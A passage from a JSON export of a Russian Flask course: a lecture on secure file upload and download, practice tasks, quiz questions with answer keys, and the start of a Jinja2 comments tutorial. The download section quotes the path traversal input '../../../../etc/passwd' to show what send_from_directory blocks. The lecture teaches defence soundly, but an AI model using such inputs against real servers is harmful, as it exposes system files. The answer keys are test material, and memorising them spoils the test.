&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash(\"Файл не найден в запросе\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return redirect(request.url)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file = request.files[\"file\"]\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if file.filename == \"\":\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash(\"Файл не выбран\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return redirect(request.url)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if not allowed_file(file.filename, file.mimetype):\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash(\"Недопустимый тип файла\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return redirect(request.url)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;safe_name = generate_filename(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secure_filename(file.filename)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)\r\n \r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file.save(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.path.join(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.config[\"UPLOAD_FOLDER\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;safe_name\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)\r\n \r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash(\"Файл успешно загружен\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return redirect(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url_for(\"download_file\", name=safe_name)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)\r\n \r\n &nbsp;&nbsp;&nbsp;return render_template(\"upload.html\")</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">7.1. Проверка метода запроса</span></p><p><span style=\"color:black;\"><code>if request.method == \"POST\":</code></span></p><p><span style=\"color:black;\">request.method содержит HTTP-метод текущего запроса</span></p><p><span style=\"color:black;\">Если пользователь отправил форму — выполняется код загрузки</span></p><p><span style=\"color:black;\">Если это обычный заход на страницу — код ниже не выполняется</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.2. Проверка наличия файла в запросе</span></p><pre><code class=\"language-python\">if \"file\" not in request.files:\r\n &nbsp;&nbsp; flash(\"Файл не найден в запросе\")\r\n &nbsp;&nbsp; return redirect(request.url)</code></pre><p><span style=\"color:black;\">request.files — словарь загруженных файлов</span></p><p><span style=\"color:black;\">\"file\" — имя поля &lt;input type=\"file\" name=\"file\"&gt;</span></p><p><span style=\"color:black;\">Когда это срабатывает:</span></p><p><span style=\"color:black;\">- форма отправлена без файла</span></p><p><span style=\"color:black;\">- повреждённый запрос</span></p><p><span style=\"color:black;\">- неправильное имя поля</span></p><p><span style=\"color:black;\">flash() — сохраняет сообщение для пользователя</span></p><p><span style=\"color:black;\">redirect(request.url) — возвращает пользователя на страницу загрузки</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.3. Получение объекта файла</span></p><p><span style=\"color:black;\"><code>file = request.files[\"file\"]</code></span></p><p><span style=\"color:black;\">file — объект FileStorage</span></p><p><span style=\"color:black;\">Он содержит:</span></p><p><span style=\"color:black;\">- имя файла</span></p><p><span style=\"color:black;\">- MIME-тип</span></p><p><span style=\"color:black;\">- содержимое файла</span></p><p><span style=\"color:black;\">- методы (save())</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.4. Проверка: выбран ли файл</span></p><pre><code class=\"language-python\">if file.filename == \"\":\r\n &nbsp;&nbsp; flash(\"Файл не выбран\")\r\n &nbsp;&nbsp; return redirect(request.url)</code></pre><p><span style=\"color:black;\">Почему это нужно:</span></p><p><span style=\"color:black;\">Браузер может отправить форму:</span></p><p><span style=\"color:black;\">- без выбранного файла</span></p><p><span style=\"color:black;\">- с пустым именем</span></p><p><span style=\"color:black;\">Без этой проверки сервер может попытаться сохранить «пустоту».</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.5. Проверка типа файла</span></p><pre><code class=\"language-python\">if not allowed_file(file.filename, file.mimetype):\r\n &nbsp;&nbsp; flash(\"Недопустимый тип файла\")\r\n &nbsp;&nbsp; return redirect(request.url)</code></pre><p><span style=\"color:black;\">Функция allowed_file обычно проверяет:</span></p><p><span style=\"color:black;\">расширение файла (.png, .pdf, …)</span></p><p><span style=\"color:black;\">MIME-тип (image/png, application/pdf, …)</span></p><p><span style=\"color:black;\">Зачем это нужно:</span></p><p><span style=\"color:black;\">защита от загрузки:</span></p><p><span style=\"color:black;\">- исполняемых файлов</span></p><p><span style=\"color:black;\">- скриптов</span></p><p><span style=\"color:black;\">- вредоносного содержимого</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.6. Формирование безопасного имени файла</span></p><pre><code class=\"language-python\">safe_name = generate_filename(\r\n &nbsp;&nbsp; secure_filename(file.filename)\r\n)</code></pre><p><span style=\"color:black;\">Здесь сразу две защиты</span></p><p><span style=\"color:black;\">secure_filename(...)</span></p><p><span style=\"color:black;\">удаляет:</span></p><p><span style=\"color:black;\">- пробелы</span></p><p><span style=\"color:black;\">- спецсимволы</span></p><p><span style=\"color:black;\">- ../</span></p><p><span style=\"color:black;\">- защищает от path traversal</span></p><p><span style=\"color:black;\">generate_filename(...)</span></p><p><span style=\"color:black;\">создаёт уникальное имя (обычно через UUID)</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.7. Сохранение файла</span></p><pre><code class=\"language-python\">file.save(\r\n &nbsp;&nbsp; os.path.join(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app.config[\"UPLOAD_FOLDER\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_name\r\n &nbsp;&nbsp; )\r\n)</code></pre><p><span style=\"color:black;\">UPLOAD_FOLDER — безопасная директория вне приложения</span></p><p><span style=\"color:black;\">os.path.join корректно формирует путь для ОС</span></p><p><span style=\"color:black;\">файл сохраняется под уникальным именем</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.8. Сообщение об успехе.</span></p><p><span style=\"color:black;\">flash(\"Файл успешно загружен\")</span></p><p><span style=\"color:black;\">сообщение сохраняется в сессии</span></p><p><span style=\"color:black;\">будет показано пользователю на следующей странице</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.9. Перенаправление на скачивание файла</span></p><p><span style=\"color:black;\"><code>url_for(\"download_file\", name=safe_name)</code></span></p><p><span style=\"color:black;\">- генерирует URL маршрута download_file</span></p><p><span style=\"color:black;\">- подставляет имя файла</span></p><p><span style=\"color:black;\">redirect(...)</span></p><p><span style=\"color:black;\">отправляет браузеру команду перейти по этому URL</span></p><p><span style=\"color:black;\">Почему redirect:</span></p><p><span style=\"color:black;\">После POST-запроса принято делать redirect, чтобы:</span></p><p><span style=\"color:black;\">- избежать повторной отправки формы</span></p><p><span style=\"color:black;\">- соблюдать паттерн POST → REDIRECT → GET</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7.10. Обработка GET-запроса</span></p><p><span style=\"color:black;\"><code>return render_template(\"upload.html\")</code></span></p><p><span style=\"color:black;\">Если запрос не POST (обычный переход по ссылке):</span></p><p><span style=\"color:black;\">- Flask возвращает HTML-форму загрузки</span></p><p><span style=\"color:black;\">- пользователь видит страницу /upload/</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Общая логика работы:</span></p><p><span style=\"color:black;\">- Пользователь открывает /upload/ → GET</span></p><p><span style=\"color:black;\">- Flask показывает форму</span></p><p><span style=\"color:black;\">- Пользователь выбирает файл и нажимает «Загрузить»</span></p><p><span style=\"color:black;\">- Браузер отправляет POST</span></p><p><span style=\"color:black;\">Сервер:</span></p><p><span style=\"color:black;\">- проверяет файл</span></p><p><span style=\"color:black;\">- сохраняет его безопасно</span></p><p><span style=\"color:black;\">- сообщает об успехе</span></p><p><span style=\"color:black;\">- перенаправляет на скачивание</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>8. Маршрут просмотра (скачивания) файла</strong></span></p><pre><code class=\"language-python\">@app.route(\"/download/&lt;name&gt;\")\r\ndef download_file(name):\r\n &nbsp;&nbsp;&nbsp;return send_from_directory(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.config[\"UPLOAD_FOLDER\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name,\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;as_attachment=True\r\n &nbsp;&nbsp;&nbsp;)</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">8.1. Декоратор маршрута</span></p><p><span style=\"color:black;\"><code>@app.route(\"/download/&lt;name&gt;\")</code></span></p><p><span style=\"color:black;\">Регистрирует URL-маршрут /download/…</span></p><p><span style=\"color:black;\">&lt;name&gt; — динамический параметр URL</span></p><p><span style=\"color:black;\">Всё, что стоит после /download/, будет передано в функцию как аргумент name</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">8.2. Функция-представление</span></p><p><span style=\"color:black;\"><code>def download_file(name)</code></span></p><p><span style=\"color:black;\">download_file — endpoint (его имя используется в url_for)</span></p><p><span style=\"color:black;\">name — имя файла, которое пользователь хочет скачать</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">8.3. send_from_directory</span></p><pre><code class=\"language-python\">return send_from_directory(\r\n &nbsp;&nbsp; app.config[\"UPLOAD_FOLDER\"],\r\n &nbsp;&nbsp; name,\r\n &nbsp;&nbsp; as_attachment=True\r\n)</code></pre><p><span style=\"color:black;\">Это специальная функция Flask для безопасной отправки файлов клиенту.</span></p><p><span style=\"color:black;\">Что делает send_from_directory</span></p><p><span style=\"color:black;\">- Берёт файл только из указанной директории</span></p><p><span style=\"color:black;\"><code>app.config[\"UPLOAD_FOLDER\"]</code></span></p><p><span style=\"color:black;\">- Защищает от атак вида:</span></p><p><span style=\"color:black;\"><code>../../../../etc/passwd</code></span></p><p><span style=\"color:black;\">- Проверяет существование файла</span></p><p><span style=\"color:black;\">- Формирует корректный HTTP-ответ</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">8.4. Параметр as_attachment=True</span></p><p><span style=\"color:black;\">Ключевой параметр безопасности</span></p><p><span style=\"color:black;\">Он означает:</span></p><p><span style=\"color:black;\">браузер скачает файл</span></p><p><span style=\"color:black;\">а не попытается:</span></p><p><span style=\"color:black;\">- открыть HTML</span></p><p><span style=\"color:black;\">- выполнить JavaScript</span></p><p><span style=\"color:black;\">- отобразить SVG</span></p><p><span style=\"color:black;\">- интерпретировать PDF как страницу</span></p><p><span style=\"color:black;\">Что происходит на уровне HTTP</span></p><p><span style=\"color:black;\">Flask добавляет заголовок:</span></p><p><span style=\"color:black;\">Content-Disposition: attachment</span></p><p><span style=\"color:black;\">Это:</span></p><p><span style=\"color:black;\">- предотвращает XSS</span></p><p><span style=\"color:black;\">- исключает выполнение пользовательского контента</span></p><p><span style=\"color:black;\">- делает поведение браузера предсказуемым</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">8.5. Почему нельзя просто читать файл и возвращать его</span></p><p><span style=\"color:black;\">- нет заголовков</span></p><p><span style=\"color:black;\">- нет защиты от path traversal</span></p><p><span style=\"color:black;\">- браузер может попытаться выполнить файл</span></p><p><span style=\"color:black;\">- нет обработки ошибок</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Этот маршрут безопасно отдаёт загруженный файл пользователю, не позволяя браузеру выполнять или интерпретировать его содержимое.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>12. Обработка ошибки 413 (слишком большой файл)</strong></span></p><pre><code class=\"language-python\">@app.errorhandler(RequestEntityTooLarge)\r\ndef handle_file_too_large(e):\r\n &nbsp;&nbsp;&nbsp;return \"Файл слишком большой\", 413</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">Этот код обрабатывает ошибку 413 (Request Entity Too Large), которая возникает, когда пользователь пытается загрузить файл больше разрешённого размера, заданного в:</span></p><p><span style=\"color:black;\">app.config[\"MAX_CONTENT_LENGTH\"]</span></p><p><span style=\"color:black;\">Без этого обработчика Flask:</span></p><p><span style=\"color:black;\">либо вернёт стандартную HTML-страницу ошибки,</span></p><p><span style=\"color:black;\">либо (в dev-сервере) может просто разорвать соединение.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">12.1. Декоратор</span></p><p><code>@app.errorhandler(RequestEntityTooLarge)</code></p><p><span style=\"color:black;\">Это регистрация обработчика ошибки.</span></p><p><span style=\"color:black;\">Он говорит Flask:</span></p><p><span style=\"color:black;\">\"Если в приложении возникает исключение RequestEntityTooLarge,</span></p><p><span style=\"color:black;\">используй функцию ниже для формирования ответа пользователю\".</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">12.2. RequestEntityTooLarge — это исключение из Werkzeug, которое соответствует HTTP-статусу:</span></p><p><span style=\"color:black;\"><code>413 Request Entity Too Large</code></span></p><p><span style=\"color:black;\">Flask выбрасывает его автоматически, если:</span></p><p><span style=\"color:black;\">размер тела запроса (например, файла)</span></p><p><span style=\"color:black;\">превышает MAX_CONTENT_LENGTH</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">12.3. Обработчик ошибки</span></p><p><span style=\"color:black;\"><code>def handle_file_too_large(e)</code></span></p><p><span style=\"color:black;\">e — объект исключения</span></p><p><span style=\"color:black;\">в данном случае он не используется, но должен присутствовать в сигнатуре функции</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">12.4. Возвращаемый ответ</span></p><p><span style=\"color:black;\"><code>return \"Файл слишком большой\", 413</code></span></p><p><span style=\"color:black;\">Flask понимает это как:</span></p><p><span style=\"color:black;\">- response_body = \"Файл слишком большой\"</span></p><p><span style=\"color:black;\">- status_code = 413</span></p><p><span style=\"color:black;\">И формирует HTTP-ответ:</span></p><p><span style=\"color:black;\">HTTP/1.1 413 Request Entity Too Large</span></p><p><span style=\"color:black;\">Content-Type: text/html; charset=utf-8</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">В dev-сервере Flask возможно принудительное закрытие соединения —</span></p><p><span style=\"color:black;\">это нормально.</span></p><p><span style=\"color:black;\">На боевом WSGI-сервере (Gunicorn, uWSGI) клиент получит корректный 413.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Если убрать код:</span></p><p><span style=\"color:black;\"><code>@app.errorhandler(RequestEntityTooLarge)</code></span></p><p><span style=\"color:black;\">то:</span></p><p><span style=\"color:black;\">Flask может вернуть стандартную страницу ошибки</span></p><p><span style=\"color:black;\">или dev-сервер разорвёт соединение</span></p><p><span style=\"color:black;\">пользователь не поймёт, что именно произошло.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><h4>Итоги лекции про загрузку файлов</h4><p><span style=\"color:black;\">&nbsp;</span></p><h4>Типичные ошибки</h4><p><span style=\"color:black;\">- &nbsp;Нет secret_key</span></p><p><span style=\"color:black;\">- &nbsp;Нет MAX_CONTENT_LENGTH</span></p><p><span style=\"color:black;\">- &nbsp;Нет проверки MIME-типа</span></p><p><span style=\"color:black;\">- &nbsp;Оригинальные имена файлов</span></p><p><span style=\"color:black;\">- &nbsp;Директория uploads не создаётся</span></p><p><span style=\"color:black;\">- &nbsp;Файлы лежат в папке приложения</span></p><p><span style=\"color:black;\">- &nbsp;Отсутствует обработка 413</span></p><p><span style=\"color:black;\">XSS-уязвимость возникает, если:</span></p><p><span style=\"color:black;\">- пользовательский контент отдаётся как HTML</span></p><p><span style=\"color:black;\">- отсутствует экранирование</span></p><p><span style=\"color:black;\">- неправильно выставлены HTTP-заголовки</span></p><p><span style=\"color:black;\">Сам факт загрузки файла не создаёт XSS.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><h4>Лучшие практики</h4><p><span style=\"color:black;\">- &nbsp;Всегда secure_filename()</span></p><p><span style=\"color:black;\">- &nbsp;Генерируйте UUID</span></p><p><span style=\"color:black;\">- &nbsp;Проверяйте MIME + расширение</span></p><p><span style=\"color:black;\">- &nbsp;Ограничивайте размер</span></p><p><span style=\"color:black;\">- &nbsp;Храните файлы вне приложения</span></p><p><span style=\"color:black;\">- &nbsp;Используйте send_from_directory</span></p><p><span style=\"color:black;\">- &nbsp;Отдавайте файлы как attachment</span></p><p><span style=\"color:black;\">- &nbsp;Используйте облачное хранилище в продакшене</span></p><p><span style=\"color:black;\">&nbsp;</span></p><h4>Хранение файлов в реальных проектах</h4><p><span style=\"color:black;\">Плохо:</span></p><p><span style=\"color:black;\">- хранить файлы рядом с кодом</span></p><p><span style=\"color:black;\">- хранить под оригинальными именами</span></p><p><span style=\"color:black;\">- отдавать напрямую через Flask в больших объёмах</span></p><p><span style=\"color:black;\">Хорошо:</span></p><p><span style=\"color:black;\">если локально, то хранить в: instance/uploads</span></p><p><span style=\"color:black;\">если продакшн, то хранить в облачных хранилищах, таких как:</span></p><p><span style=\"color:black;\">- S3</span></p><p><span style=\"color:black;\">- Supabase Storage</span></p><p><span style=\"color:black;\">- MinIO</span></p><p><span style=\"color:black;\">- Cloudflare R2</span></p><p><span style=\"color:black;\">Flask при этом хранит только путь или URL, а не сам файл.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 7,
            "section_id": 1,
            "number": 4,
            "name": "Практические примеры",
            "slug": "practics",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Вернитесь к приложению по оценке успеваемости студентов.<o:p></o:p></span></span></p><p><span style=\"color:black;font-family:;\"><span style=\"line-height:115%;mso-ansi-language:RU;mso-bidi-language:AR-SA;mso-bidi-theme-font:minor-bidi;mso-fareast-font-family:Calibri;mso-fareast-language:EN-US;mso-fareast-theme-font:minor-latin;mso-themecolor:text1;\" times=\"\" new=\"\" roman\",\"serif\";font-size:14.0pt;\"=\"\">Уберите в выводимом списке маркеры списка.</span></span></p>"
                    },
                    {
                        "id": 2,
                        "content": "<p><span style=\"font-family:;\"><span style=\"line-height:115%;mso-ansi-language:RU;mso-bidi-language:AR-SA;mso-bidi-theme-font:minor-bidi;mso-fareast-font-family:Calibri;mso-fareast-language:EN-US;mso-fareast-theme-font:minor-latin;\" times=\"\" new=\"\" roman\",\"serif\";font-size:14.0pt;\"=\"\">Добавьте в список студентов условную подсветку строк: если балл меньше 50 — строка красного цвета, от 50 до 79 — жёлтого, 80 и выше — зелёного</span></span></p>"
                    },
                    {
                        "id": 3,
                        "content": "<p class=\"MsoNormal\"><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:stroke joinstyle=\"miter\"><v:formulas><v:f eqn=\"if lineDrawn pixelLineWidth 0\"><v:f eqn=\"sum @0 1 0\"><v:f eqn=\"sum 0 0 @1\"><v:f eqn=\"prod @2 1 2\"><v:f eqn=\"prod @3 21600 pixelWidth\"><v:f eqn=\"prod @3 21600 pixelHeight\"><v:f eqn=\"sum @0 0 1\"><v:f eqn=\"prod @6 1 2\"><v:f eqn=\"prod @7 21600 pixelWidth\"><v:f eqn=\"sum @8 21600 0\"><v:f eqn=\"prod @7 21600 pixelHeight\"><v:f eqn=\"sum @10 21600 0\"></v:f></v:f></v:f></v:f></v:f></v:f></v:f></v:f></v:f></v:f></v:f></v:f></v:formulas><v:path o:extrusionok=\"f\" gradientshapeok=\"t\" o:connecttype=\"rect\"><o:lock v:ext=\"edit\" aspectratio=\"t\"></o:lock></v:path></v:stroke></v:shapetype><v:shape style=\"height:152.15pt;left:0;margin-left:90.05pt;margin-top:17.4pt;mso-position-horizontal-relative:text;mso-position-horizontal:absolute;mso-position-vertical-relative:text;mso-position-vertical:absolute;mso-wrap-distance-bottom:0;mso-wrap-distance-left:9pt;mso-wrap-distance-right:9pt;mso-wrap-distance-top:0;mso-wrap-style:square;position:absolute;text-align:left;visibility:visible;width:164.15pt;z-index:1;\" id=\"Рисунок_x0020_1\" o:spid=\"_x0000_s1026\" type=\"#_x0000_t75\"><v:imagedata src=\"file:///C:\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"></v:imagedata></v:shape><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Сделайте вывод информации не в виде списка, а в виде таблицы.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Что то типа :</span></span></p><figure class=\"image image_resized\" style=\"width:17.87%;\"><img style=\"aspect-ratio:346/321;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/4948f1ae-bc40-4b39-b3a3-55d5cbabc7b8.png\" width=\"346\" height=\"321\"></figure><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p>"
                    },
                    {
                        "id": 4,
                        "content": "<p class=\"MsoNormal\">Добавьте в таблицу результатов дополнительный столбец «Статус», где будет выводиться текст «Сдал» или «Не сдал» в зависимости от набранного балла (порог =&nbsp;<span style=\"mso-spacerun:yes;\"> </span>60)<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">.<o:p></o:p></span></span></p>"
                    },
                    {
                        "id": 5,
                        "content": "<p><span style=\"font-family:;\"><span style=\"line-height:115%;mso-ansi-language:RU;mso-bidi-language:AR-SA;mso-bidi-theme-font:minor-bidi;mso-fareast-font-family:Calibri;mso-fareast-language:EN-US;mso-fareast-theme-font:minor-latin;\" times=\"\" new=\"\" roman\",\"serif\";font-size:14.0pt;\"=\"\">Отсортируйте список студентов по убыванию баллов, используя только возможности шаблона Jinja2</span></span></p>"
                    },
                    {
                        "id": 6,
                        "content": "<p><span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;font-size:14.0pt;\"><span style=\"line-height:115%;mso-ansi-language:RU;mso-bidi-language:AR-SA;mso-bidi-theme-font:minor-bidi;mso-fareast-font-family:Calibri;mso-fareast-language:EN-US;mso-fareast-theme-font:minor-latin;\">Добавьте на страницу результатов вывод среднего балла по группе, не изменяя структуру списка студентов в </span></span><span style=\"font-size:10.0pt;\"><code><span style=\"line-height:115%;mso-ansi-language:RU;mso-bidi-language:AR-SA;mso-fareast-font-family:Calibri;mso-fareast-language:EN-US;mso-fareast-theme-font:minor-latin;\">app.py</span></code></span></p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Передаёт управление браузеру без рендеринга HTML",
                            "Рендерит HTML-шаблон и возвращает готовый HTTP-ответ ",
                            "Загружает CSS-файлы из папки static",
                            "Создаёт новый маршрут приложения Flask"
                        ],
                        "question": "Какое назначение функции render_template() во Flask?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "loop.index ",
                            "loop.counter",
                            "loop.i",
                            "index"
                        ],
                        "question": "Какой объект Jinja2 используется для получения номера текущей итерации цикла, начиная с 1?",
                        "correct_index": 0
                    },
                    {
                        "id": 3,
                        "options": [
                            "Проверяет HTML на ошибки",
                            "Отключает автоматическое экранирование HTML ",
                            "Шифрует данные",
                            "Преобразует HTML в безопасный текст"
                        ],
                        "question": "Что делает фильтр safe в Jinja2?",
                        "correct_index": 1
                    }
                ],
                "theory_html": "<p>Важное замечание.</p><p>Если на прошлом занятии вы сделали динамически формируемое меню, запомните эту возможность, но сейчас верните всё назад, к статичным гиперссылкам в виде:</p><p class=\"a\"><code><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\">&lt;li&gt;&lt;a href=\"{{ url_for('index') }}\"&gt;</span><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\">Главная</span><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\">&lt;/a&gt;&lt;/li&gt;</span></code><span lang=\"EN-US\"></span></p><p><span lang=\"EN-US\"></span></p><h4>&nbsp;</h4><h4>1. Пример страницы комментариев</h4><p>Давайте сделаем, что ни будь более крупное.</p><p>Допустим у нас <span lang=\"EN-US\">web</span>-приложение - блог, с возможность оставлять комментарии.</p><p>Пусть у нас есть список комментариев в переменной типа список. В реальном приложении эти комментарии будут хранится в базе данных и запрашиваться оттуда.</p><p>&nbsp;</p><p></p><p>1. В <span lang=\"EN-US\">app</span>.<span lang=\"EN-US\">py</span> создайте маршрут на страницу <span lang=\"EN-US\">comments</span>.<span lang=\"EN-US\">html</span>, и вставьте туда переменную - список с 5 комментариями. Код будет такой:<span>&nbsp;</span></p><pre><code class=\"language-python\">@app.route(\"/comments/\")\r\ndef comments():\r\n  comments = [\r\n &nbsp;&nbsp; 'Первый комментарий',\r\n &nbsp;&nbsp; 'Второй комментарий',\r\n &nbsp;&nbsp; 'Третий комментарий',\r\n &nbsp;&nbsp; 'Четвёртый комментарий',\r\n &nbsp;&nbsp; 'Пятый комментарий'<span lang=\"EN-US\"></span>\r\n  ]<span lang=\"EN-US\"></span>\r\n  return render_template('comments.html', title=\"Комментарии\", comments=comments)<span lang=\"EN-US\"></span></code></pre><p>т.е. список комментариев мы отправляем параметром в шаблон страницы <code>comments.html</code> .</p><p></p><p>&nbsp;</p><p>2. В папке <span lang=\"EN-US\">templates</span> создайте файл <code><span lang=\"EN-US\">comments</span>.<span lang=\"EN-US\">html</span></code> со следующим кодом:</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n<span lang=\"EN-US\"></span>\r\n{% block content %}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n  &lt;h1&gt;{{title}}&lt;/h1&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n  &lt;div class=\"comments-container\"&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; {% for comment in comments %}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;div class=\"comment-block\"&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;p class=\"comment-text\"&gt;{{ comment }}&lt;/p&gt;<span 